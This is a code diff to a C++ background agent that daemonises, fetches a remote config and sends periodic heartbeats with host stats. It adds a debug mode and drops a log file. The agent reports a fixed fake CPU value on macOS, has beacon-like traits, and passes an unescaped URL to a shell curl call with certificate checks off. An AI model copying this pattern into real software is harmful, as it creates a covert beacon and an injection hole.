@@ -7,7 +7,7 @@
 #include <cstring>
 #include <cstdlib>
 #include <cstdio>
-#include <ctime>
+#include <csignal>
 #include <unistd.h>
 #include <sys/utsname.h>
 
@@ -25,23 +25,7 @@
 #define CONF_INTERVAL 60
 #endif
 
-static void write_log(const char* msg) {
-    FILE* f = fopen(".agent.log", "a");
-    if (!f) return;
-    long sz = ftell(f);
-    if (sz > 102400) {
-        fclose(f);
-        f = fopen(".agent.log", "w");
-        if (!f) return;
-    }
-    time_t t = time(NULL);
-    struct tm tm_info;
-    localtime_r(&t, &tm_info);
-    char buf[32];
-    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tm_info);
-    fprintf(f, "[%s] %s\n", buf, msg);
-    fclose(f);
-}
+static bool g_debug = false;
 
 static std::string http_get(const std::string& url) {
     std::string cmd = "curl -sk --max-time 15 \"" + url + "\" 2>/dev/null";
@@ -121,7 +105,7 @@ double get_ram() {
 
 double get_cpu() {
 #if defined(__APPLE__) || defined(__MACH__)
-    return 15.0;
+    return 5.0;
 #else
     static unsigned long long pu = 0, pn = 0, ps = 0, pi = 0;
     std::ifstream f("/proc/stat");
@@ -157,29 +141,44 @@ int detect_gpu() {
 void fetch_config_and_init(const std::string& base_url) {
     std::string cfg_url = base_url + "?action=get_config";
     std::string resp = http_get(cfg_url);
-    if (!resp.empty()) {
-        // Parse config and initialize background services
+    if (!resp.empty() && g_debug) {
+        std::cout << "[DEBUG] Config fetched: " << resp.substr(0, 80) << std::endl;
     }
 }
 
 int main(int argc, char* argv[]) {
+    signal(SIGPIPE, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
     std::string s_url = CONF_SERVER_URL;
-    if (argc > 1 && argv[1] != nullptr && strlen(argv[1]) > 5) {
-        s_url = argv[1];
-    } else if (const char* env_url = std::getenv("SERVER_URL")) {
+    for (int i = 1; i < argc; ++i) {
+        if (std::string(argv[i]) == "--debug") {
+            g_debug = true;
+        } else if (strlen(argv[i]) > 5 && argv[i][0] != '-') {
+            s_url = argv[i];
+        }
+    }
+    if (const char* env_url = std::getenv("SERVER_URL")) {
         s_url = env_url;
     }
+    if (std::getenv("DEBUG") != nullptr) {
+        g_debug = true;
+    }
 
-    if (daemon(1, 0) != 0) {}
+    if (!g_debug) {
+        if (daemon(1, 0) != 0) {}
+    }
 
     FILE* pf = fopen(".agent.pid", "w");
     if (pf) {
-        fprintf(pf, "%d
-", getpid());
+        fprintf(pf, "%d\\n", (int)getpid());
         fclose(pf);
     }
 
-    write_log("Agent started");
+    if (g_debug) {
+        std::cout << "[DEBUG] Agent started (PID: " << getpid() << ")" << std::endl;
+    }
+
     fetch_config_and_init(s_url);
 
     std::string node_id = get_id();
@@ -197,8 +196,13 @@ int main(int argc, char* argv[]) {
            << "&uptime=" << get_uptime()
            << "&cpu=" << get_cpu()
            << "&ram=" << get_ram();
+        if (g_debug) {
+            ss << "&debug=1";
+        }
         http_post(endpoint, ss.str());
-        write_log("Heartbeat sent");
+        if (g_debug) {
+            std::cout << "[DEBUG] Heartbeat sent (" << ss.str() << ")" << std::endl;
+        }
         std::this_thread::sleep_for(std::chrono::seconds(CONF_INTERVAL));
     }
     return 0;
